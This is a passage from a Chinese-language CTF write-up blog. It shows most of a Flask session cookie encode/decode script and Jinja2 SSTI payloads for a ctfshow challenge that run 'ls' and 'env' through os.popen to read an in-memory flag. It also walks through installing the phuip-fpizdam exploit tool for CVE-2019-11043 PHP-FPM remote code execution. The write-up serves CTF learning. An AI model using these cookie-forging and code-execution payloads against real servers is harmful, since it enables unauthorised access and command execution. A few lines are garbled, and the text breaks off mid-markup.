data-num=\"21\"></td><td><pre><span class=\"token comment\"># external Imports</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">from</span> flask<span class=\"token punctuation\">.</span>sessions <span class=\"token keyword\">import</span> SecureCookieSessionInterface</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">MockApp</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> secret_key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        self<span class=\"token punctuation\">.</span>secret_key <span class=\"token operator\">=</span> secret_key</pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>version_info<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token keyword\">and</span> sys<span class=\"token punctuation\">.</span>version_info<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># >= 3.0 &amp;&amp; &lt; 3.4</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name\">FSCM</span><span class=\"token punctuation\">(</span>metaclass<span class=\"token operator\">=</span>ABCMeta<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">def</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>secret_key<span class=\"token punctuation\">,</span> session_cookie_structure<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token triple-quoted-string string\">\"\"\" Encode a Flask session cookie \"\"\"</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                app <span class=\"token operator\">=</span> MockApp<span class=\"token punctuation\">(</span>secret_key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                session_cookie_structure <span class=\"token operator\">=</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                    ast<span class=\"token punctuation\">.</span>literal_eval<span class=\"token punctuation\">(</span>session_cookie_structure<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                si <span class=\"token operator\">=</span> SecureCookieSessionInterface<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                s <span class=\"token operator\">=</span> si<span class=\"token punctuation\">.</span>get_signing_serializer<span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>session_cookie_structure<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token string\">\"[Encoding error] &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                <span class=\"token keyword\">raise</span> e</pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">def</span> <span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>session_cookie_value<span class=\"token punctuation\">,</span> secret_key<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            <span class=\"token triple-quoted-string string\">\"\"\" Decode a Flask cookie  \"\"\"</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>secret_key <span class=\"token operator\">==</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>                    compressed <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>                    payload <span class=\"token operator\">=</span> session_cookie_value</pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>                    <span class=\"token keyword\">if</span> payload<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                        compressed <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                        payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>                    data <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                    data <span class=\"token operator\">=</span> base64_decode<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>                    <span class=\"token keyword\">if</span> compressed<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>                        data <span class=\"token operator\">=</span> zlib<span class=\"token punctuation\">.</span>decompress<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                    <span class=\"token keyword\">return</span> data</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>                    app <span class=\"token operator\">=</span> MockApp<span class=\"token punctuation\">(</span>secret_key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>                    si <span class=\"token operator\">=</span> SecureCookieSessionInterface<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>                    s <span class=\"token operator\">=</span> si<span class=\"token punctuation\">.</span>get_signing_serializer<span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>                    <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>session_cookie_value<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token string\">\"[Decoding error] &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>                <span class=\"token keyword\">raise</span> e</pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># > 3.4</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name\">FSCM</span><span class=\"token punctuation\">(</span>ABC<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token keyword\">def</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>secret_key<span class=\"token punctuation\">,</span> session_cookie_structure<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>            <span class=\"token triple-quoted-string string\">\"\"\" Encode a Flask session cookie \"\"\"</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>                app <span class=\"token operator\">=</span> MockApp<span class=\"token punctuation\">(</span>secret_key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>                session_cookie_structure <span class=\"token operator\">=</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>                    ast<span class=\"token punctuation\">.</span>literal_eval<span class=\"token punctuation\">(</span>session_cookie_structure<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>                si <span class=\"token operator\">=</span> SecureCookieSessionInterface<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>                s <span class=\"token operator\">=</span> si<span class=\"token punctuation\">.</span>get_signing_serializer<span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>                <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>session_cookie_structure<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>            <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token string\">\"[Encoding error] &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>                <span class=\"token keyword\">raise</span> e</pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>        <span class=\"token keyword\">def</span> <span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>session_cookie_value<span class=\"token punctuation\">,</span> secret_key<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>            <span class=\"token triple-quoted-string string\">\"\"\" Decode a Flask cookie  \"\"\"</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>secret_key <span class=\"token operator\">==</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>                    compressed <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>                    payload <span class=\"token operator\">=</span> session_cookie_value</pre></td></tr><tr><td data-num=\"99\"></td><td><pre></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>                    <span class=\"token keyword\">if</span> payload<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>                        compressed <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>                        payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>                    data <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>                    data <span class=\"token operator\">=</span> base64_decode<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>                    <span class=\"token keyword\">if</span> compressed<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>                        data <span class=\"token operator\">=</span> zlib<span class=\"token punctuation\">.</span>decompress<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>                    <span class=\"token keyword\">return</span> data</pre></td></tr><tr><td data-num=\"111\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>                    app <span class=\"token operator\">=</span> MockApp<span class=\"token punctuation\">(</span>secret_key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>                    si <span class=\"token operator\">=</span> SecureCookieSessionInterface<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>                    s <span class=\"token operator\">=</span> si<span class=\"token punctuation\">.</span>get_signing_serializer<span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>                    <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>session_cookie_value<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>            <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token string\">\"[Decoding error] &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>                <span class=\"token keyword\">raise</span> e</pre></td></tr><tr><td data-num=\"121\"></td><td><pre></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>    <span class=\"token comment\"># Args are only relevant for __main__ usage</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    <span class=\"token comment\"># Description for help</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    parser <span class=\"token operator\">=</span> argparse<span class=\"token punctuation\">.</span>ArgumentParser<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>        description<span class=\"token operator\">=</span><span class=\"token string\">'Flask Session Cookie Decoder/Encoder'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>        epilog<span class=\"token operator\">=</span><span class=\"token string\">\"Author : Wilson Sumanang, Alexandre ZANNI\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    <span class=\"token comment\"># prepare sub commands</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    subparsers <span class=\"token operator\">=</span> parser<span class=\"token punctuation\">.</span>add_subparsers<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>        <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'sub-command help'</span><span class=\"token punctuation\">,</span> dest<span class=\"token operator\">=</span><span class=\"token string\">'subcommand'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>    <span class=\"token comment\"># create the parser for the encode command</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    parser_encode <span class=\"token operator\">=</span> subparsers<span class=\"token punctuation\">.</span>add_parser<span class=\"token punctuation\">(</span><span class=\"token string\">'encode'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'encode'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>    parser_encode<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-s'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'--secret-key'</span><span class=\"token punctuation\">,</span> metavar<span class=\"token operator\">=</span><span class=\"token string\">'&lt;string>'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>                               <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'Secret key'</span><span class=\"token punctuation\">,</span> required<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>    parser_encode<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-t'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'--cookie-structure'</span><span class=\"token punctuation\">,</span> metavar<span class=\"token operator\">=</span><span class=\"token string\">'&lt;string>'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>                               <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'Session cookie structure'</span><span class=\"token punctuation\">,</span> required<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>    <span class=\"token comment\"># create the parser for the decode command</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>    parser_decode <span class=\"token operator\">=</span> subparsers<span class=\"token punctuation\">.</span>add_parser<span class=\"token punctuation\">(</span><span class=\"token string\">'decode'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'decode'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>    parser_decode<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-s'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'--secret-key'</span><span class=\"token punctuation\">,</span> metavar<span class=\"token operator\">=</span><span class=\"token string\">'&lt;string>'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>                               <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'Secret key'</span><span class=\"token punctuation\">,</span> required<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>    parser_decode<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-c'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'--cookie-value'</span><span class=\"token punctuation\">,</span> metavar<span class=\"token operator\">=</span><span class=\"token string\">'&lt;string>'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>                               <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'Session cookie value'</span><span class=\"token punctuation\">,</span> required<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>    <span class=\"token comment\"># get args</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>    args <span class=\"token operator\">=</span> parser<span class=\"token punctuation\">.</span>parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>    <span class=\"token comment\"># find the option chosen</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>subcommand <span class=\"token operator\">==</span> <span class=\"token string\">'encode'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>secret_key <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span> <span class=\"token keyword\">and</span> args<span class=\"token punctuation\">.</span>cookie_structure <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>FSCM<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>secret_key<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">.</span>cookie_structure<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>    <span class=\"token keyword\">elif</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>subcommand <span class=\"token operator\">==</span> <span class=\"token string\">'decode'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>secret_key <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span> <span class=\"token keyword\">and</span> args<span class=\"token punctuation\">.</span>cookie_value <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>FSCM<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>cookie_value<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">.</span>secret_key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>        <span class=\"token keyword\">elif</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>cookie_value <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>FSCM<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>cookie_value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>后面为 ssti 注入</p>\n<p><code>?ctfshow=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[66].__init__.__globals__[\"__builtins__\"].eval('__import__(\"os\").popen(\"ls\").read()')&#125;&#125;</code></p>\n<p>返回正常，想访问内部文件，无果</p>\n<p>flag 在内存 (查阅资料)</p>\n<p>试着读取环境变量</p>\n<p><code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[66].__init__.__globals__[\"__builtins__\"].eval('__import__(\"os\").popen(\"env\").read()')&#125;&#125;</code></p>\n<h2 id=\"一览无余\"><a class=\"anchor\" href=\"#一览无余\">#</a> 一览无余</h2>\n<p>一览无余（需要再次学习）直接看 wp 发现为 <code>CVE-2019-11043</code> <br />\n 利用工具：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25lZXgvcGh1aXAtZnBpemRhbQ==\">PHuiP-FPizdaM</span></p>\n<h3 id=\"安装过程\"><a class=\"anchor\" href=\"#安装过程\">#</a> 安装过程:</h3>\n<h4 id=\"1-安装go环境-如果没有的话\"><a class=\"anchor\" href=\"#1-安装go环境-如果没有的话\">#</a> 1. 安装 go 环境 (如果没有的话)</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root全县辖</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">apt-get</span> update</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">apt</span> <span class=\"token function\">install</span> gccgo-go</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">apt</span> <span class=\"token function\">install</span> golang-go</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>途中一直回车</pre></td></tr></table></figure><h4 id=\"2-安装phuip-fpizdam\"><a class=\"anchor\" href=\"#2-安装phuip-fpizdam\">#</a> 2. 安装 phuip-fpizdam</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> clone https://github.com/neex/phuip-fpizdam.git phuip-fpizdam</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> phuip-fpizdam</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>go get <span class=\"token parameter variable\">-v</span> <span class=\"token operator\">&amp;&amp;</span> go build 或 go <span class=\"token function\">install</span> phuip-fpizdam</pre></td></tr></table></figure><p>若出现</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>go: github.com&#x2F;spf13&#x2F;cobra@v0.0.5: Get &quot;https:&#x2F;&#x2F;proxy.golang.org&#x2F;github.com&#x2F;spf13&#x2F;cobra&#x2F;@v&#x2F;v0.0.5.mod&quot;: dial tcp 142.251.43.17:443: connect: connection refused</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>go: github.com&#x2F;spf13&#x2F;cobra@v0.0.5: Get &quot;https:&#x2F;&#x2F;proxy.golang.org&#x2F;github.com&#x2F;spf13&#x2F;cobra&#x2F;@v&#x2F;v0.0.5.mod&quot;: dial tcp 142.251.43.17:443: connect: connection refused</pre></td></tr></table></figure><p>原因为 go 代理默认为国外，</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>go <span class=\"token function\">env</span> <span class=\"token parameter variable\">-w</span> <span class=\"token assign-left variable\">GOPROXY</span><span class=\"token operator\">=</span>https://goproxy.cn</pre></td></tr></table></figure><ol>\n<li>\n<p>进行修改</p>\n</li>\n<li>\n<p>重复第三步</p>\n</li>\n</ol>\n<p><img data-src=\"%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/%E4%B8%80%E8%A7%88%E6%97%A0%E4%BD%99_1.jpg\" alt=\"\" /></p>\n<p>出现此下载完成</p>\n<h4 id=\"使用\"><a class=\"anchor\" href=\"#使用\">#</a> 使用</h4>\n<pre><code class=\"language-火绒\">\n出现 done! 即为执行成功\n\n执行成功，那么即可通过 url/index.php?a=shellcode(ls等)\n只有部分 PHP-FPM 子进程受到了污染，因此需要尝试几次以执行该命令。\n\n</code></pre>\n<p>参考：<span class=\"exturl\" 